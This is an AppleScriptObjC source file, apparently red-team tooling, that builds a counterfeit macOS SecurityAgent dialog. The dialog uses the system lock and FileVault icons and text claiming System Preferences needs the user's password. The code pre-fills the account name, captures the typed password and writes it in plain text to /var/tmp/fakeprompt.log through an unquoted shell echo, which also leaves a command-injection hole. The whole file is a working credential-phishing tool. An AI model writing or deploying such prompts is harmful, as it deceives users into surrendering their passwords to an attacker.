(*
 * Fake SecurityAgent prompt with app icon overlay
 * 
 * Coded by https://github.com/n0ncetonic
 *
   Copyright © 2018 Blacksun Labs
   
   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

 *)
use framework "Cocoa"
use scripting additions

property NSAlert : class "NSAlert"
property NSTextField : class "NSTextField"
property NSImage : class "NSImage"
property NSSecureTextField : class "NSSecureTextField"
property NSGraphicsContext : class "NSGraphicsContext"
property NSMakeRect : class "NSMakeRect"

global theView

(*
 * Overlay icon onto lock icon 
 *)
on createIconWithOverlay(overlayIcon)
	set mainIcon to NSImage's imageNamed:"NSSecurity"
	set overlayIcon to NSImage's imageNamed:overlayIcon
	set mSize to mainIcon's |size|() as record
	set mWidth to width of mSize
	mainIcon's lockFocus()
	tell NSGraphicsContext's currentContext
		its setImageInterpolation:3
	end tell
	overlayIcon's drawInRect:(current application's NSMakeRect(mWidth / 2, 0, mWidth / 2, mWidth / 2)) fromRect:(my NSZeroRect) operation:(my NSCompositeSourceOver) fraction:1.0
	mainIcon's unlockFocus()
	return mainIcon
end createIconWithOverlay

(*
Create the label
*)
on createInputWithLabel:labelText labelXY:{labelX:labelX, labelY:labelY} inputXY:{inputX:inputX, inputY:inputY}
	set inputLabel to NSTextField's alloc's initWithFrame:{{labelX, labelY}, {75.5, 17}}
	tell inputLabel
		(its setEditable:false)
		(its setBordered:false)
		its setDrawsBackground:false
		its (cell()'s setWraps:false)
		its setStringValue:labelText
		its setAlignment:(my NSRightTextAlignment)
	end tell
	
	if labelText = "Password:" then
		set inputBox to NSSecureTextField's alloc's initWithFrame:{{inputX, inputY}, {248.5, 22}}
		inputBox's setTag:1
	else
		set inputBox to NSTextField's alloc's initWithFrame:{{inputX, inputY}, {248.5, 22}}
		inputBox's setStringValue:(long user name of (system info))
	end if
	theView's addSubview:inputLabel
	theView's addSubview:inputBox
	theView's display()
end createInputWithLabel:labelXY:inputXY:

set theView to my (NSView's alloc's initWithFrame:{{0, 0}, {329, 52}})

my createInputWithLabel:"User Name:" labelXY:{labelX:0, labelY:33} inputXY:{inputX:80.5, inputY:30}
my createInputWithLabel:"Password:" labelXY:{labelX:0, labelY:2} inputXY:{inputX:80.5, inputY:0}

(*
Leverage NSAlert to avoid as much Cocoa boilerplate as possible. Add textfields and labels to the NSAlert's Accessory View as NSAlert generates and styles all other components automagically
*)

set bundle to my (NSBundle's bundleWithPath:"/System/Library/CoreServices/CoreTypes.bundle")
set vaultIcon to bundle's imageForResource:"FileVaultIcon.icns"
vaultIcon's setName:"VaultIcon"

set alert to NSAlert's alloc's init()

tell alert
	#its setIcon:(NSImage's imageNamed:"NSSecurity")
	its setIcon:(my createIconWithOverlay("VaultIcon"))
	its setMessageText:"System Preferences is trying to unlock Security & Privacy preferences."
	its setInformativeText:"Enter your password to allow this."
	its addButtonWithTitle:"Unlock"
	its addButtonWithTitle:"Cancel"
	its setAccessoryView:theView
	alert's layout()
	theView's release()
end tell

(*
Become first responder to get blinking cursor in
password field.

Make sure the user clicked "Unlock" or pressed the enter key
then grab the value of the password field
*)
(alert's accessoryView's viewWithTag:1)'s becomeFirstResponder()

(*
Display the NSAlert and send output to /var/tmp/fakeprompt.log
*)
set resultCode to alert's runModal()
if resultCode = 1000 then
	set userInput to (theView's viewWithTag:1)'s stringValue()
	do shell script "echo " & (userInput as text) & " > /var/tmp/fakeprompt.log"
end if